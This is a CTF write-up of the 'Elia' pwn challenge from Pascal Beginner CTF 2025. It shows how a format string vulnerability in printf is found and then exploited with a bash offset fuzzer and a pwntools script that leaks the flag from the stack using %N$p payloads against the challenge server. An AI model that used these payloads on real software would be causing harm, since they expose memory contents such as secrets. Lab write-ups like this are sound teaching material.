# Elia (pwn2) - Pascal Beginner CTF 2025

# Analyze
Binary is very simple, it takes a string as input and prints it.
```
benjamin@hacking:elia$ ./elia 
Wow, it actually compiled! Do you want to write something?
hello
hello
```

Lets analyze it better with gdb
```c
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x0000000000001030  puts@plt
0x0000000000001040  fclose@plt
0x0000000000001050  __stack_chk_fail@plt
0x0000000000001060  printf@plt
0x0000000000001070  alarm@plt
0x0000000000001080  fgets@plt
0x0000000000001090  signal@plt
0x00000000000010a0  setvbuf@plt
0x00000000000010b0  fopen@plt
0x00000000000010c0  exit@plt
0x00000000000010d0  _start
0x00000000000011c9  init
0x000000000000122a  handle_alarm
0x000000000000124e  main
0x000000000000135c  _fini
```

We don't have any exotic functions to analyze, so let's analyze the main with radare2.
```
 0x0000131d      488d45d0       lea rax, [format]
│     ││    0x00001321      be1e000000     mov esi, 0x1e               ; int size
│     ││    0x00001326      4889c7         mov rdi, rax                ; char *s
│     ││    0x00001329      e852fdffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│     ││    0x0000132e      488d45d0       lea rax, [format]
│     ││    0x00001332      4889c7         mov rdi, rax                ; const char *format
│     ││    0x00001335      b800000000     mov eax, 0
│     ││    0x0000133a      e821fdffff     call sym.imp.printf         ; int printf(const char *format)
│     ││    0x0000133f      b800000000     mov eax, 0
```

printf doesn't specify the format so we have a format string vuln.
```
benjamin@hacking:elia$ ./elia 
Wow, it actually compiled! Do you want to write something?
%p
0x7b6161211963
```

# Solve
We can leak memory by reading the stack, but where on the stack is the flag located?

We can write a `fuzzer` that finds the stack offset at which the program starts saving the flag.
```bash
#!/bin/bash

for i in $(seq 100)
do
echo "Offset $i : %$i\$p" | ./elia
done
```

Which combined with `| grep "63736170"`, where 63736170 are the first 8 bytes of the format flag in hex little endian (backwards) returns precisely the offset, i.e. 8
```
benjamin@hacking:elia$ ./fuzzer.sh | grep "63736170"
Offset 8 : 0x54436c6163736170
```

Since we can read a maximum of 8 bytes at a time, we need to read about `5 consecutive offsets` starting from the 8th and we have the flag!

# Script
```py
from pwn import *

exe = context.binary = ELF(args.EXE or 'elia')
context.log_level = 'critical'

HOST = "elia.challs.pascalctf.it"
PORT = 1339

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)
    

gdbscript = '''
tbreak main
continue
'''.format(**locals())


leaked_memory = b""
i = 0

for i in range(5):
    io = start()

    welcome_message = io.recvuntil(b"something?\n")

    io.sendline(f"%{8+i}$p".encode())
    
    try:
        leaked_memory += bytes.fromhex(io.recvline().decode().replace("0x", ""))[::-1]
    except:
        pass
    
    try:
        log.critical(f"Memory Leaked Successfully: {leaked_memory}")
    except:
        exit(1)

    i += 1
    
    io.close()
    if "}" in leaked_memory.decode():
        log.critical(f"Flag: {leaked_memory.decode()}")
```
